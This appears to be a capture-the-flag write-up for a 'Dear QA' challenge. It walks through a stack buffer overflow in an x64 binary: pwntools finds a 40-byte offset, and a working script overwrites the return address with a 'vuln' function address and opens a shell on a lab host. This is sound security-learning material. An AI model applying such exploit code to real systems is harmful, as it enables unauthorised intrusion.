# Dear QA

### Dear QA
- What is the binary architecture?<br />
![image](https://github.com/user-attachments/assets/824417ab-32eb-49c3-822e-7bc0dad8e6a2)<br />
`x64`
- What is the flag?<br />
I download the provided binary to test the exploit on it. First I execute the following code:

      from pwn import *
      
      io = process('./DearQA-1627223337406.DearQA')
      print(io.recv(timeout=2))
      
      io.sendline(cyclic(500))
      io.wait()
      core = io.corefile
      stack = core.rsp
      info("rsp = %#x", stack)
      pattern = core.read(stack, 4)
      rip_offset = cyclic_find(pattern)
      info("rip offset is %d", rip_offset)
This will print out the offset before overwriting the RIP:<br />
![image](https://github.com/user-attachments/assets/2490ec03-bbbd-4676-a916-635e43ea88a4)<br />
So I know now that the offset is `40` bytes. Now I need to find a way to exploit this function. So inside gdb I run `info functions vuln` to get the address of the vulnerable function:<br />
![image](https://github.com/user-attachments/assets/5261d189-6de8-4b35-b16f-8587b2e8042c)<br />
So now I know that the vuln function has address `0x0000000000400686` (This will not change since ASLR is disabled, thankfully).<br />
That is all, I know the offset and I know the address of the vuln function, I just need to concatenate them to successfully run the exploit. So I developed the following pwntools script:<br />

    from pwn import *
    
    #p = process("./DearQA-1627223337406.DearQA")
    ip = "10.10.216.94"
    port = 5700
    p = remote(ip,port)
    
    offset = 40
    
    ret = p64(0x0000000000400686)
    
    payload = b"A"*offset
    payload += ret
    
    p.sendline(payload)
    
    p.interactive()
And finally run the exploit:<br />
![image](https://github.com/user-attachments/assets/88003f44-4c69-4faa-b980-4c7fa1ecd7ae)<br />

